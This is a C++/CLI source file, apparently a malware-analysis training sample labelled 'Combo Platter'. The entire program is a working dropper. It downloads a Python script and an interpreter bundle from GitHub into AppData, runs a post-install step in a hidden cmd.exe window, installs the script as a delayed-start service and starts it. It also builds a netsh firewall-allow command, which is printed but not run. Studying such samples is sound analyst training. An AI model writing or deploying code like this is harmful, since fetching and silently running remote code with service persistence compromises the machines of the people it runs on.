// Example 7 - Combo Platter.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <iostream>
#include <string>
#include <Windows.h>
#include <comdef.h>
#include <shlwapi.h>
#include <Shlobj.h> 

#using <mscorlib.dll>
#using <System.dll>

#include <tchar.h>

using namespace std;
using namespace System;
using namespace System::Net;
using namespace System::IO;
using namespace System::Text;
using namespace System::IO::Compression;
using namespace System::Diagnostics;



void error(DWORD retval) {
	_com_error error(retval);
	wcout << error.ErrorMessage() << endl;
}

string encryptDecrypt(string toEncrypt) {
	string output = toEncrypt;

	for (int i = 0; i < toEncrypt.size(); i++)
		output[i] = toEncrypt[i] ^ 0x5a;

	return output;
}

int main()
{
	String^ url = "https://www.github.com";
	String^ downloadzipurl = "https://raw.githubusercontent.com/SneakyNachos/MalwareAnalysisTraining/master/FakeService3/venv.zip";
	
	String^ downloadscripturl = "https://raw.githubusercontent.com/SneakyNachos/MalwareAnalysisTraining/master/FakeService3/FakeService3.py";
	//Encoding^ encode = System::Text::Encoding::GetEncoding("utf-8");
	Encoding^ ascii = Encoding::ASCII;
	Uri^ myUri = gcnew Uri(url);
	HttpWebResponse^ res = nullptr;
	ServicePointManager::SecurityProtocol = SecurityProtocolType::Tls | SecurityProtocolType::Ssl3 | SecurityProtocolType::Tls11 | SecurityProtocolType::Tls12;
	ServicePointManager::UseNagleAlgorithm = true;
	ServicePointManager::Expect100Continue = true;
	ServicePointManager::CheckCertificateRevocationList = true;
	ServicePoint^ mySP;
	
	HttpWebRequest ^wrGETURL;
	//Check if Alive
	while (TRUE) {
		wrGETURL = dynamic_cast<HttpWebRequest^>(HttpWebRequest::Create(url));
		res = dynamic_cast<HttpWebResponse^>(wrGETURL->GetResponse());
		if (res->StatusCode != HttpStatusCode::OK) {
			Sleep(5000);
		}
		else {
			break;
		}
	}
	
	mySP = wrGETURL->ServicePoint;

	wrGETURL = dynamic_cast<HttpWebRequest^>(HttpWebRequest::Create(downloadscripturl));
	res = dynamic_cast<HttpWebResponse^>(wrGETURL->GetResponse());
	Console::WriteLine(res->StatusCode);

	Stream ^objStream = res->GetResponseStream();
	StreamReader ^objReader = gcnew StreamReader(objStream);
	String^ scriptText = "";
	
	scriptText = objReader->ReadToEnd();	
	//Console::WriteLine(sline);
	char tempHomePath[MAX_PATH];
	long result = SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, tempHomePath);
	String^ homePath = gcnew String(tempHomePath);
	homePath += ("\\Appdata\\Local");
	String^ scriptPath(homePath);
	scriptPath += ("\\FakeService3.py");
	File::WriteAllText(scriptPath, scriptText);
	Console::WriteLine("Finished FakeService3");
	wrGETURL = dynamic_cast<HttpWebRequest^>(HttpWebRequest::Create(downloadzipurl));
	res = dynamic_cast<HttpWebResponse^>(wrGETURL->GetResponse());

	WebClient ^webClient = gcnew WebClient();
	webClient->Headers->Add("Accept: text/html, application/xhtml+xml, */*");
	webClient->Headers->Add("User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)");
	String^ zipPath(homePath);
	zipPath += ("\\venv.zip");
	webClient->DownloadFile(gcnew Uri(downloadzipurl), zipPath);
	Console::WriteLine("Got zip");

	String^ extractPath(homePath);
	ZipFile::ExtractToDirectory(zipPath,extractPath);
	Console::WriteLine("Done");

	String^ pythonPath(extractPath);
	pythonPath += ("\\venv\\Scripts\\python.exe");

	String^ command("/C ");
	command += (pythonPath);
	command += (" ");
	command += (scriptPath);
	command += (" ");
	command += ("--startup=delayed install");
	Console::WriteLine(command);

	
	String^ postinstallcommand = gcnew String(pythonPath);
	postinstallcommand += " ";
	postinstallcommand += (homePath);
	postinstallcommand += ("\\venv\\Scripts\\pywin32_postinstall.py");
	postinstallcommand += (" ");
	postinstallcommand += ("-install");
	Console::WriteLine(postinstallcommand);
	Process^ process = gcnew Process();
	ProcessStartInfo^ startInfo = gcnew ProcessStartInfo();
	startInfo->WindowStyle = ProcessWindowStyle::Hidden;
	startInfo->FileName = "cmd.exe";
	startInfo->Arguments = postinstallcommand;
	process->StartInfo = startInfo;
	process->Start();
	Console::WriteLine("Command completed");

	Process^ process2 = gcnew Process();
	ProcessStartInfo^ startInfo2 = gcnew ProcessStartInfo();
	//startInfo2->WindowStyle = ProcessWindowStyle::Hidden;
	startInfo2->FileName = "cmd.exe";
	startInfo2->Arguments = command;
	process2->StartInfo = startInfo2;
	process2->Start();
	Console::WriteLine("Command completed");

	String^ firewallChange = gcnew String("/C netsh advfirewall firewall add rule name=\"Test\" profile=domain,private protocol=any enable=yes DIR=In program =\"");
	firewallChange += pythonPath;
	firewallChange += ("\" Action=Allow");
	Console::WriteLine(firewallChange);

	String^ startservicecommand = gcnew String("/C net start \"Testing Service Final\"");
	Process^ process4 = gcnew Process();
	ProcessStartInfo^ startInfo4 = gcnew ProcessStartInfo();
	//startInfo4->WindowStyle = ProcessWindowStyle::Hidden;
	startInfo4->FileName = "cmd.exe";
	startInfo4->Arguments = startservicecommand;
	process4->StartInfo = startInfo4;
	process4->Start();
	Console::WriteLine("Command completed");
	
	


	/*
	
	
	objStream = res->GetResponseStream();
	objReader = gcnew StreamReader(objStream, Encoding::UTF8);
	String^ zipText = "";
	zipText = (objReader->ReadToEnd());
	Console::WriteLine("Going to write");
	File::WriteAllText(zipPath, zipText);
	*/
	





		
	
	
	
	
}

